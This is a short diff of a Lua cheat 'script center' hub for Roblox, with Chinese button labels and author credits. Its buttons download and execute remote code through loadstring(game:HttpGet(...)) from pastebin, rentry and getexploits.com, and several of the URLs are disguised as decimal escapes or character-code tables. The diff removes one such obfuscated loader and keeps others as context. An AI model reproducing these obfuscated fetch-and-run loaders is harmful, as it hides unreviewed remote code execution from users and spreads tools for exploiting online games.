@@ -2378,12 +2378,6 @@ tool:Button("脚本中心1.5",function()
  loadstring(game:HttpGet("\104\116\116\112\115\58\47\47\112\97\115\116\101\98\105\110\46\99\111\109\47\114\97\119\47\103\101\109\120\72\119\65\49"))()
 end)
 
-Script:Button("HUA脚本中心<Beta>",function()
-      _G["ScriptCenter作者:三岁高材生"]="ScriptCenter"local SCC_CharPool={
-[1]= tostring(utf8.char((function() return table.unpack({104,116,116,112,115,58,47,47,114,101,110,116,114,121,46,99,111,47,83,99,114,105,112,116,67,101,110,116,101,114,66,121,72,117,105,83,104,97,110,103,111,110,103,122,117,111,115,104,105,47,114,97,119})end)()))}
-loadstring(game:HttpGet(SCC_CharPool[1],true))()
-end)
-
 tool:Button("最像白脚本的脚本",function()
         loadstring(game:HttpGet('https://getexploits.com/key-system/',true))('https://da.com/936657404291084298/1006220505583460352/Script.txt')
 end)
@@ -2453,7 +2447,6 @@ About:Label("三岁高材生［提供部分脚本功能］")
 About:Label("飞舞幻想作者[提供部分帮助]")
 
 About:Label("某沙雕鸭子[提供部分帮助]")
-
 
 local Statement = creds:section("声明",true)
 
